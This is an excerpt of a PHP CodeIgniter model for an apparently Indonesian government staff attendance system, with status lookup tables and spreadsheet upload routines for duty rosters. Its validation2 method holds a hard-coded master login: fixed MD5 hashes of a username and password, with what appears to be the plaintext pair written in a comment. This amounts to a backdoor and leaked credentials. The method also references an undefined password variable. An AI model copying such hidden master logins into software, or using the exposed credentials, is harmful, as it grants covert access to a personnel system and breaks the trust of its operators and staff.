...
class Utils_model extends CI_Model{
    ...
    public function validation2($username)
    {
        //4dm1nk03 3Sid1kDagR1
        if ((md5($username)=="01c190dc88b6932d46e38a2ca70f53e3") && (md5($password)=="4454e8f03d483ef7d4d831aaf44626a1") )
        {
            ...
            $sql = "SELECT users.id,users.userid,users.username, users.email, users.dept_id, 
                ...
                from users
                left join departments on departments.deptid=users.dept_id 
              WHERE username = ? AND users.state=1";
	...
	public function getStatusPegawai()
    {
        ...
        $arr["8"] = "HONORER";
		$arr["7"] = "TNI / POLRI";
        $arr["10"] = "MASA PERSIAPAN PENSIUN (MPP)";
		

        return $arr;
    }

    public function getStatusDarling()
    {
        $arr["30"] = "Upacara";
        $arr["29"] = "WFH";
        return $arr;
    ...
    {
        $arr["0"] = "Belum Diproses";
        $arr["1"] = "Disetujui";
        $arr["2"] = "Ditolak";
        return $arr;
    }
	
	public function getStatusKetidakhadiran()
    {
        $arr["AB_6"] = "Cuti Sakit";
        $arr["AB_13"] = "Penugasan Dari Pimpinan (Dalam / Luar Negeri)";
        $arr["WFH"] = "Work From Home";
        return $arr;
    }
	
	public function getStatusKehadiran()
    {
        $arr["AT_AT1"] = "Tidak Absen Datang Karena Rapat di Luar Kantor";
        $arr["AT_AT2"] = "Tidak Absen Pulang Karena Rapat di Luar Kantor)";
        return $arr;
    }

    public function getJenisPegawai()
    {
        $arr["1"] = "PNS KEMENDAGRI";
        $arr["2"] = "PNS INSTANSI LAIN DPK";
        $arr["3"] = "PNP KEMENDAGRI DPK PD INSTANSI LAIN";
        $arr["4"] = "PRAJA IPDN";
        $arr["5"] = "JENIS KEPEGAWAIAN LAIN-LAIN / TITIPAN";
        $arr["6"] = "JENIS KEPEGAWAIAN Sementara";
        $arr["7"] = "KELUAR DARI KEMENDAGRI";
        $arr["8"] = "PNS PADA DKPP";
		$arr["10"] = "PNS PADA BNPP";
        return $arr;
    }
    ...
    public function upload_data($bulan,$filename){
        ...
        if ($sts) {
            ...
            for ($i = 1; $i < ($numRows + 1); $i++) {
                $snip = preg_replace("/[^0-9]/", '',str_replace(' ', '', $worksheet[$i]["A"]));
     ...
     public function upload_data_jadwal($filename){
        $sts=true;
        ini_set('memory_limit', '-1');
        $inputFileName = './assets/uploads/'.$filename;
        try {
        ...
        if ($sts) {
           ...
           for ($row = 2; $row <= $highestRow; $row++){ 
                ...
                $nip = str_replace(' ', '', $rowData[0][0]);
                $tgl = $rowData[0][2];
                $abc = str_replace(' ', '', $rowData[0][3]);
                $bln = $rowData[0][5];
                $thn = $rowData[0][4];
                ...
                if ($bukatutup) {
                    if ($jml==0) {
                        ...
                        createLog("Membuat jadwal " . $nip . " " . $tgl . " " . $abc, "Sukses");
                    }else{
                        $savedata = array( "absence" => $abc);
                        $this->db->where('rosterdate', $tgl);
                        $this->db->where('userid', $nip);
                        $this->db->update('rosterdetails', $savedata);
                        createLog("Merubah jadwal " . $nip . " " . $tgl . " " . $abc, "Sukses");
                    }
                }
            }
        }
	...
	public function carideptnamebykode($kodeid)
    {
        $this->db->select_min('deptname');
        $this->db->from('departments');
        $this->db->where('deptid', $kodeid);
        $query = $this->db->get();
        if($query->num_rows()==1)
        {
